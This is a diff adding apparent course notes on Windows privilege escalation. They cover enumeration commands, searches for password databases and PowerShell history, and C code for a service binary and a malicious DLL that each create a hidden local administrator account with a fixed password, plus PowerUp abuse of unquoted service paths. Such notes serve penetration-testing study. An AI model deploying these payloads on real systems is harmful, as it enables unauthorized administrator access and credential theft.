@@ -1,0 +1,135 @@
+---Enumerating Windows---
++++Understanding Windows Privileges and Access Control Mechanisms
+S-R-X-Y
+The first part is a literal "S", which indicates that the string is a SID.
+
+"R" stands for revision and is always set to "1", since the overall SID structure continues to be on its initial version.
+
+"X" determines the identifier authority. This is the authority that issues the SID. For example, "5" is the most common value for the identifier authority. It specifies NT Authority and is used for local or domain users and groups.
+
+"Y" represents the sub authorities of the identifier authority. Every SID consists of one or more sub authorities. This part consists of the domain identifier and relative identifier (RID). The domain identifier is the SID of the domain for domain users, the SID of the local machine for local users, and "32" for built-in principals. The RID determines principals such as users or groups.
+
++++Situational Awareness
+There are several key pieces of information we should always obtain:
+
+- Username and hostname
+- Group memberships of the current user
+- Existing users and groups
+- Operating system, version and architecture
+- Network information
+- Installed applications
+- Running processes
+
+PS> whoami /groups
+PS> Get-LocalUser
+PS> Get-LocalGroup
+PS> Get-LocalGroupMember adminteam
+PS> systeminfo
+PS> ipconfig /all
+PS> route print
+PS> netstat -ano
+
+we'll check all installed applications
+PS> Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
+PS> Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
+PS> Get-Process
+
++++Hidden in Plain View
+PS> Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
+PS> Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
+PS> Get-ChildItem -Path C:\Users\dave\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
+PS> runas /user:backupadmin cmd
+
++++Information Goldmine PowerShell
+PS> Get-History
+PS> (Get-PSReadlineOption).HistorySavePath
+C:\Users\dave\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+PS> type C:\Users\dave\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+
+---Leveraging Windows Services---
++++Service Binary Hijacking
+-> Get service is running
+PS> Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
+
+-> icacls command
+Mask	Permissions
+F	Full access
+M	Modify access
+RX	Read and execute access
+R	Read-only access
+W	Write-only access
+
+PS> icacls "C:\xampp\apache\bin\httpd.exe"
+
+-> C code to add user
+```#include <stdlib.h>
+
+int main ()
+{
+  int i;
+  
+  i = system ("net user dave2 password123! /add");
+  i = system ("net localgroup administrators dave2 /add");
+  
+  return 0;
+}```
+
+$ x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
+
+-> Stop service: net stop mysql
+-> Get Startmode of service: Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}
+-> List member of local admin: Get-LocalGroupMember administrators
+
+PowerUp.ps1
+-> Get-ModifiableServiceFile: This function displays services the current user can modify, such as the service binary or configuration files.
+
++++DLL Hijacking
+-> C code
+```
+#include <stdlib.h>
+#include <windows.h>
+
+BOOL APIENTRY DllMain(
+HANDLE hModule,// Handle to DLL module
+DWORD ul_reason_for_call,// Reason for calling function
+LPVOID lpReserved ) // Reserved
+{
+    switch ( ul_reason_for_call )
+    {
+        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
+        int i;
+  	    i = system ("net user dave3 password123! /add");
+  	    i = system ("net localgroup administrators dave3 /add");
+        break;
+        case DLL_THREAD_ATTACH: // A process is creating a new thread.
+        break;
+        case DLL_THREAD_DETACH: // A thread exits normally.
+        break;
+        case DLL_PROCESS_DETACH: // A process unloads the DLL.
+        break;
+    }
+    return TRUE;
+}
+```
+$ x86_64-w64-mingw32-gcc TextShaping.cpp --shared -o TextShaping.dll
+
++++Unquoted Service Paths
+PS> Get-CimInstance -ClassName win32_service | Select Name,State,PathName
+CMD> wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """
+
+- Start/Stop service
+PS> Start-Service GammaService
+PS> Stop-Service GammaService
+PS> Restart-Service GammaService
+
+Use PowerUp.ps1 to exploit
+PS> Get-UnquotedService
+PS> Write-ServiceBinary -Name 'GammaService' -Path "C:\Program Files\Enterprise Apps\Current.exe"
+
+---Abusing Other Windows Components---
++++Scheduled Tasks
+Once the command is executed, we get a huge amount of output with information about all scheduled tasks on the system. We should seek interesting information in the Author, TaskName, Task To Run, Run As User, and Next Run Time fields. In our case, "interesting" means that the information partially or completely answers one of the three questions above.
+PS> schtasks /query /fo LIST /v
+
++++Using Exploits
+
